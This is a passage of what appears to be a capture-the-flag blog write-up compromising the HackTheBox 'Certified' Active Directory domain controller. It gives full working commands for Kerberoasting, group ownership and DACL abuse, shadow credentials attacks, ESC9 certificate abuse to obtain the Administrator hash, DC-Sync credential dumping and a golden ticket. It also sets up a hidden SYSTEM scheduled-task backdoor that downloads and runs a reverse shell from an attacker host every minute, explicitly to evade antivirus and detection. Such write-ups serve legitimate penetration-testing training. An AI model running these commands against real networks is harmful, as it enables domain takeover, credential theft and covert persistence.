Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49265/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49681/tcp open msrpc Microsoft Windows RPC 49708/tcp open msrpc Microsoft Windows RPC 49729/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (88%) Aggressive OS guesses: Microsoft Windows Server 2019 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-06T15:09:26 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 206.50 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nNaming contexts: DC=certified,DC=htb CN=Configuration,DC=certified,DC=htb CN=Schema,CN=Configuration,DC=certified,DC=htb DC=DomainDnsZones,DC=certified,DC=htb DC=ForestDnsZones,DC=certified,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=certified,DC=htb ldapServiceName: certified.htb:dc01$@CERTIFIED.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=certified,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries. We have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;certified.htb\u0026quot; update_var machine \u0026quot;DC01\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host\u0026rsquo;s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win:\nnetexec ldap $box -u '' -p '' --asreproast asrep.txt This fails as NULL sessions are disabled. netexec ldap $box -u guest -p '' --asreproast asrep.txt This lets me know that the guest account is disabled. We also have creds though so lets try with those:\nnetexec ldap $box -u $user -p $pass --asreproast asrep.txt No dice. Kerberoasting to retrieve the management_svc hash: As we have creds we can also kerberoast using netexec: We get one for management_svc: Trying to crack management_svc hash: I run the hash through hashcat using rockyou but it does not crack: hashcat -m 13100 kerb.out /home/kali/Wordlists/rockyou.txt We can put this in our back-pocket for later. 2. Foothold: Enumerating as Judith: A lot these steps will seem jumbled when looking at time stamps, just know I was jumping between different windows etc when doing things. Connecting as Judith to SMB: Lets connect to SMB and see what we can find: netexec smb $box -u $user -p $pass --shares She has access to 3 shares, the interesting one is SYSVOL as these often have scripts. Using smbclient: I check SYSVOL but there is nothing of note:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; I check NETLOGOn but there is nothing of note:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\NETLOGON\u0026quot; Attempting to connect via evil-winrm: I attempt to connect via evil-winrm but we cannot: evil-winrm -i $box -u $user -p $pass Enumerating Users with Impacket-lookupsid: I try and gather more information via impacket-lookupsid: impacket-lookupsid $domain/$user@$machine.$domain -domain-sids We can see we have more users here which is interesting so I will add them to my list of users, what is especially interesting is the Alias Cert Publishers as this indicates AD-CS is running (although it was not present in the scans so far). Lets continue to enumerate. Bloodhound collection: Attempted Bloodhound collection using netexec: I try and run a bloodhound collection using netexec but it does not work (in fact it never works for me…): netexec ldap $machine.$domain -u $user -p $pass --bloodhound --collection All Bloodhound collection via bloodhound-python: I run bloodhound-python to get a collection, which works: It works. I ingest this into bloodhound. Running certipy-ad to enumerate vulnerable certificates: Whilst bloodhound ingests our data lets enumerate the CA. There has been nothing obvious other than the alias Cert Publishers to indicate it\u0026rsquo;s running \u0026amp; the fact the box is called \u0026ldquo;Certified\u0026rdquo;.\nI run certipy-ad to enumerate the CA:\ncertipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box No templates found under this current user. Discovering our user has GenericWrite privs over MANAGEMENT_SVC: Looking at our bloodhound results we can see that our user \u0026ldquo;Judith\u0026rdquo; has WriteOwner privs over the group \u0026ldquo;Management\u0026rdquo; who The \u0026ldquo;Management\u0026rdquo; group in-turn has GenericWrite over the account \u0026ldquo;MANAGEMENT_SVC\u0026rdquo; whos\u0026rsquo;s kerberos ticket we extracted earlier. Planning our attack path: First we will make ourselves owner of the group \u0026ldquo;Management\u0026rdquo;: As we have WriteOwner privileges over the group \u0026ldquo;Management\u0026rdquo; we can make ourselves the owner of the group: Second we will modify the rights to allow ourselves to add user Once we are owner we will then need to modify our rights to be able to add users to the group. Third we will add ourselves to the group \u0026ldquo;Management\u0026rdquo;: Fourth we will perform shadow credentials attack on \u0026ldquo;MANAGEMENT_SVC\u0026rdquo;: We can then perform a shadow credentials attack to add certificate based credentials to the user \u0026ldquo;MANAGEMENT_SVC\u0026rdquo; and then authenticate as them and request a kerberos ticket which we can then pass to be used as authentication. We can do this as we will now be part of the \u0026ldquo;Management\u0026rdquo; group and in turn have GenericWrite over the \u0026ldquo;MANAGEMENT_SVC\u0026rdquo; object. +Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector: https://bloodstiller.com/articles/shadowcredentialsattack/ Making Judith owner of the Management group \u0026amp; then adding her as a user: +Note+: For some reason impacket is displaying lots of errors but we can ignore them as it\u0026rsquo;s still completing the tasks. I\u0026rsquo;ve included them here in-case you also get them.\nMake judith the new owner of management:\nimpacket-owneredit -action write -new-owner $user -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' $domain/$user:$pass Grant Judith the ability to add users to the group by modifying the DACL\u0026rsquo;s:\nimpacket-dacledit -action 'write' -rights 'WriteMembers' -principal $user -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' $domain/$user:$pass Add judith to the group:\nnet rpc group addmem \u0026quot;Management\u0026quot; $user -U $domain/$user%$pass -S $box +Note+: There will be no output from this command, we need to instead verify it worked in the next command. Verify Judith is now part of the group:\nnet rpc group members \u0026quot;Management\u0026quot; -U $domain/$user%$pass -S $box Performing the shadow credentials attack against \u0026ldquo;MANAGEMENT_SVC\u0026rdquo;: Setting up pywhisker: As we are performing this from a linux host we need to use the python based version of whisker: https://github.com/ShutdownRepo/pywhisker git clone https://github.com/ShutdownRepo/pywhisker.git Lets create a venv so it does not mess with our base python installation:\n#Navigate into the repo: cd pywhisker #Create the venv: python -m venv whisker #Activate the venv: source whisker/bin/activate #Install our dependencies in the venv: pip install -r requirements.txt I try to run it but get the below error:\npython3 pywhisker.py -d $domain -u $user -p $pass --target \u0026quot;MANAGEMENT_SVC\u0026quot; --action \u0026quot;add\u0026quot; --filename newCert --export PEM Looking online leads me to this open issue: https://github.com/ShutdownRepo/pywhisker/issues/21 It appears to not run from a venv currently due to the way imports are handled. So we will need to check out a previous git branch. Finding a previous pywhisker commit prior to breaking changes and using that: Click \u0026ldquo;Commits\u0026rdquo;:\nFind the commmit we want:\nClick on it. Grab the full commit hash:\nCheck it out:\ngit checkout -f ec30ba5759d57ead54341f58289090a9dc01249a I found the commit that was before the breaking changes to envs:\ngit checkout -f ec30ba5759d57ead54341f58289090a9dc01249a Using pywhisker to perform our shadow credentials attack: I run pywhisker and it works:\npython3 /home/kali/windowsTools/pywhisker/pywhisker.py -d $domain -u $user -p $pass --target \u0026quot;MANAGEMENT_SVC\u0026quot; --action \u0026quot;add\u0026quot; --filename newCert --export PEM We get our newCert_cert.pem \u0026amp; our newCert_priv.pem which we will use next +Note+: If this fails and you get the below error then you should follow the steps of granting Judith the ability to add users to groups and the subsequent steps. I believe there is some sort of cleanup rule in place which cleans up ACL\u0026rsquo;s. Looking at pywhiskers readme it says:\nOnce the values are generated and added by pyWhisker, a TGT can be request with gettgtpkinit.py The NT hash can then be recovered with getnthash.py.\nInstalling PKINIT: Clone repo:\ngit clone https://github.com/dirkjanm/PKINITtools.git Setup venv:\n#Navigate into the repo: cd pkinit #Create the venv: python -m venv pk #Activate the venv: source pk/bin/activate #Install our dependencies in the venv: pip install -r requirements.txt Requesting a TGT for MANAGEMENT_SVC with PKINITtools getgtgkinit: Request TGT \u0026amp; export as .ccache by using our newCert_cert.pem \u0026amp; newCert_priv.pem:\npython3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem newCert_cert.pem -key-pem newCert_priv.pem $domain/MANAGEMENT_SVC MANAGEMENT_SVC.ccache We can see our .ccache: Next we will load the ccache into our KRB5CCNAME variable as we will need this for next step:\nexport KRB5CCNAME=./MANAGEMENT_SVC.ccache Requesting the MANAGEMENT_SVC user hash with PKINITtools getnthash: Extract the NTHash for the MANAGEMENT_SVC user:\npython3 /home/kali/windowsTools/PKINITtools/getnthash.py -key d03e77aab1235a85021ef9936275dd2e4df05d027c381d33695338dcb0772389 $domain/MANAGEMENT_SVC Hash retrieved for MANAGEMENT_SVC account. Lets verify the hash works:\nnetexec smb $box -u $user -H $hash It does. I try and crack the hash using hashcat but it wont\u0026rsquo; crack.\nLogging in as MANAGEMENT_SVC: Login using evil-winrm:\nevil-winrm -i $box -u $user -H $hash Grab our user.txt flag:\n3. Lateral Movement: Discovering that MANAGEMENT_SVC has GenericAll over CA_OPERATOR: Looking back in bloodhound I see we have GenericAll privileges over \u0026ldquo;CA_OPERATOR\u0026rdquo; which means we can actually just perform another shadow credentials attack: Performing the shadow credentials attack against \u0026ldquo;CA_OPERATOR\u0026rdquo; Lets perform our shadow credentiasl attack using pyhisker again: python3 /home/kali/windowsTools/pywhisker/pywhisker.py -d $domain -u $user -H :$hash --target \u0026quot;CA_OPERATOR\u0026quot; --action \u0026quot;add\u0026quot; --filename CACert --export PEM +Note+: I have set the user=MANAGEMENT_SVC in my variables and have exported the extracted hash also. Requesting a TGT for CA_OPERATOR with PKINITtools getgtgkinit: Now we perform the same process again to be able to extract their hash by using the .pem files we have retrieved to export a .ccache we can authenticate with:\npython3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/CA_OPERATOR CA_OPERATOR.ccache We load the ccache into our KRB5CCNAME variable:\nexport KRB5CCNAME=./CA_OPERATOR.ccache Requesting the CA_OPERATOR user hash with PKINITtools getnthash: Now we extract the NTHash:\npython3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 4c6a721a5bbe0a510df5e45f62e579a161cd734466eeaab9586c2466ea815945 $domain/CA_OPERATOR Hash retrieved for CA_OPERATOR account. Lets verify the hash works:\nnetexec smb $box -u $user -H $hash It does. I try and crack the hash using hashcat but it wont\u0026rsquo; crack either\n4. Privilege Escalation: Discovering that we can perform the ESC9 exploit chain CA vulnerability as CA_OPERATOR: I re-run certipy-ad as the \u0026ldquo;CA_OPERATOR\u0026rdquo; user:\ncertipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box It appears that we can follow the ESC9 attack chain as this user. There is only 1 certificate template: CertifiedAuthentication which will be the vulnerable one. Looking at the certipy repo we see the following:\nhttps://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10 Blog Post Mentioned ESC9 Privilege Escalation: Reading the blog post we can see the following requirements are needed: +Requirements for the attack+: GenericWrite over any account (A) to compromise any account (B): As we have GenericAll (which includes GenericWrite) over the ca_operator from the management_svc account we can perform this action. The NT Hash of Account (A) We have already extracted this the ca_operator hash in our previous shadow credentials attack Changing the UPN of the ca_operator to be administrator: Change the userPrincipalName of ca_operator to be Administrator. certipy-ad account update -username management_svc@$domain -hashes :$svcHash -user ca_operator -upn Administrator +Note+: We\u0026rsquo;re omitting the domain for ca_operator to make actions appear as if they\u0026rsquo;re performed by Administrator. This reassigns the identity so that future actions will appear as if ca_operator is the Administrator. Requesting our vulnerable cert using as the ca_operator: We request the vulnerable certificate template CertifiedAuthentication We must request the certificate as ca_operator: certipy-ad req -username ca_operator.$domain -hashes :$caHash -ca certified-DC01-CA -template CertifiedAuthentication +Note+: The userPrincipalName in the certificate is Administrator since we changed the UPN and omitted ca_operator\u0026rsquo;s domain in step 1, resulting in a certificate without the original ca_operator SID. +Why+: Changing the UPN lets us request a certificate with the Administrator\u0026rsquo;s UPN, granting elevated privileges without linking to the original ca_operator SID. Reverting the ca_operator\u0026rsquo;s UPN: Now we change back the userPrincipalName of ca_operator to the original userPrincipalName ca_operator@CERTIFIED.HTB: certipy-ad account update -username management_svc@$domain -hashes :$svcHash -user ca_operator -upn ca_operator@$domain +Why+: This avoids detection by reverting ca_operator to its default identity. Authenticating with the certificate to retrieve the NT hash of the administrator: Now we authenticate with the certificate, to receive the NT hash of the Administrator user:\ncertipy-ad auth -pfx administrator.pfx -domain $domain Hash retrieved. +Note+: We add -domain to the command because the certificate is set to administrator without a domain specified. Verify the hash works:\nevil-winrm -i $box -u $user -H $hash Grab our root flag:\n5. Persistence: Dumping NTDS.dit/DC-SYNC attack: Perform DC-Sync attack using netexec:\nnetexec smb $box -u $user -H $hash -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026quot;$file\u0026quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\\n'; done Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Run Klist:\nklist +Note+: We can see our ticket lasts for 10 years. If we look at our previous ticket, it only lasted 24 hours: Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Revoked which means there is some form of protection/mitigation in place. Instead of going down this path lets look at another solution. Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host every 1 minute: I will create a powershell script and use a download cradle to call back to my attack host, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry) so it will be harder to detect.\nCreate our reverse-shell script:\nI use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using https://revshells.com for this We then need to create our scheduled task:\nschtasks /create /tn LetMeIn /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.21:9000/script.ps1'''))'\u0026quot; /sc minute /mo 1 /ru System +Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Start our listener \u0026amp; webserver:\nWebserver: python3 -m http.server [port] Listener: rlwrap -cAr nc -nvlp 53 The task grabs our script \u0026amp; immediatley executes it in memory:\nWe get our revere shell:\nDouble check by disconnecting \u0026amp; seeing if it re-connects:\nIt does: Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown: schtasks /create Creates a new scheduled task on Windows. /tn LetMeIn Sets the task name to LetMeIn. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Specifies the action that the task will execute. powershell.exe: Starts PowerShell. Arguments passed to powershell: -WindowStyle hidden: Runs the task in a hidden window to prevent showing the PowerShell window. NoLogo -NonInteractive -ep bypass -nop: PowerShell flags to suppress output and allow script execution bypassing restrictions. IEX ((New-Object Net.WebClient).DownloadString(...)): Uses Invoke-Expression to download and immediately execute the script. /sc minute /mo 1: Sets the task to run every 1 minute. /ru System: Runs the task under System privileges. Lessons Learned: What did I learn? I learned alot more about shadow-credential attacks and CA attacks.\nI really enjoyed the process of how layered and different the attack chain was for this compared to other boxes I have done.\nWhat silly mistakes did I make? Not so many, getting better\u0026hellip;.I hope Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",
